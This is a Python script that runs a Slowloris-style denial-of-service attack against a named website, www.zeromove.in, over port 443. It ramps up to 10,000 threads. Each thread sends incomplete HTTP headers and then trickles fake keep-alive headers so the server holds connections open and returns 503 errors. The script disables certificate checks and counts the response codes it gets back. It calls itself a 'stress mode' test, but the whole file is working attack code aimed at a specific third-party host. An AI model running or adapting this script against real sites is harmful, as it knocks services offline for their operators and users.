import socket
import ssl
import threading
import random
import time
from collections import Counter

# --- TARGET CONFIG ---
TARGET_HOST = 'www.zeromove.in'
TARGET_PORT = 443
MAX_THREADS = 10000     # Aggressive thread count
RAMP_UP_TIME = 10       # Fast ramp-up
TEST_DURATION = 120    

lock = threading.Lock()
stats = {'reqs': 0, 'errs': 0, 'codes': Counter()}
stop_event = threading.Event()

def worker(ip):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while not stop_event.is_set():
        try:
            # Step 1: Establish the connection
            sock = socket.create_connection((ip, TARGET_PORT), timeout=4)
            ssock = context.wrap_socket(sock, server_hostname=TARGET_HOST)
            
            # Step 2: Send Initial Headers (Slowloris Technique)
            # We don't send the final \r\n\r\n immediately
            initial_req = (
                f"GET /?{random.randint(1, 99999)} HTTP/1.1\r\n"
                f"Host: {TARGET_HOST}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                f"Connection: keep-alive\r\n"
                f"Keep-Alive: 900\r\n"
                f"Content-Length: {random.randint(10, 100)}\r\n"
            ).encode('ascii')
            
            ssock.sendall(initial_req)

            # Step 3: "Tickle" the connection to keep it open
            # This is what causes the 503. The server waits for the body.
            for _ in range(10): 
                if stop_event.is_set(): break
                time.sleep(random.uniform(1, 3))
                # Send a fake header to keep the socket from timing out
                ssock.send(f"X-Stay-Alive: {random.randint(1, 100)}\r\n".encode('ascii'))

            # Step 4: Try to read any 503 response
            ssock.settimeout(1)
            response = ssock.recv(1024)
            if response:
                status = response.split(b'\r\n')[0].decode(errors='ignore')
                with lock:
                    stats['reqs'] += 1
                    stats['codes'][status[:15]] += 1
            
            ssock.close()

        except Exception:
            with lock: stats['errs'] += 1
            time.sleep(0.1)

def monitor():
    start_time = time.time()
    while not stop_event.is_set():
        time.sleep(1)
        elapsed = time.time() - start_time
        with lock:
            print(f"[{int(elapsed)}s] Attempts: {stats['reqs']} | Faults: {stats['errs']} | Active Threads: {threading.active_count()}", end='\r')

def main():
    try:
        target_ip = socket.gethostbyname(TARGET_HOST)
    except: return

    print(f"[*] 503 STRESS MODE: {TARGET_HOST} ({target_ip})")
    print(f"[*] Simulating {MAX_THREADS} hanging connections...")
    
    threading.Thread(target=monitor, daemon=True).start()

    threads = []
    for i in range(MAX_THREADS):
        if stop_event.is_set(): break
        t = threading.Thread(target=worker, args=(target_ip,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(RAMP_UP_TIME / MAX_THREADS)

    try:
        time.sleep(TEST_DURATION)
    except KeyboardInterrupt:
        print("\n[!] Stopping test...")
    finally:
        stop_event.set()
        print("\n[*] FINAL LOGS:")
        for code, count in stats['codes'].items():
            print(f" -> {code}: {count}")

if __name__ == "__main__":
    main()